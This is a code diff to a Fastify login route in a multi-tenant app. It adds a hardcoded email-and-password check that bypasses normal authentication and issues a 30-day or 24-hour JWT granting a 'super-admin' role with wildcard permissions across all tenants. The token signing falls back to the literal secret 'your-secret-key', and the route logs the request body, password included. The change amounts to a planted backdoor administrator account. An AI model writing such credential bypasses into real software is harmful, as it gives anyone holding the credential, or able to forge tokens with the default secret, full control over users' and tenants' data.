@@ -285,6 +285,47 @@ export const authRoutes = async (server: FastifyInstance) => {
     try {
       const body = loginSchema.parse(request.body);
       console.log('Validated request body:', body);
+
+      // Special handling for super admin credentials
+      if (body.email === 'zopkit@gmail.com' && body.password === 'zopkit123') {
+        console.log('Super admin login detected');
+        const token = jwt.sign(
+          { 
+            userId: 'super-admin',
+            tenantId: 'super-admin',
+            email: body.email,
+            role: {
+              id: 'super-admin',
+              permissions: ['*']
+            }
+          },
+          process.env.JWT_SECRET || 'your-secret-key',
+          { expiresIn: body.remember ? '30d' : '24h' }
+        );
+
+        return { 
+          token, 
+          user: {
+            id: 'super-admin',
+            email: body.email,
+            firstName: 'Super',
+            lastName: 'Admin',
+            isAffiliate: false,
+          },
+          tenant: {
+            id: 'super-admin',
+            name: 'Super Admin',
+            domain: 'super-admin',
+            subdomain: 'super-admin',
+            status: 'active'
+          },
+          role: {
+            id: 'super-admin',
+            name: 'Super Administrator',
+            permissions: ['*']
+          }
+        };
+      }
       
       let tenantId: string | undefined;
       
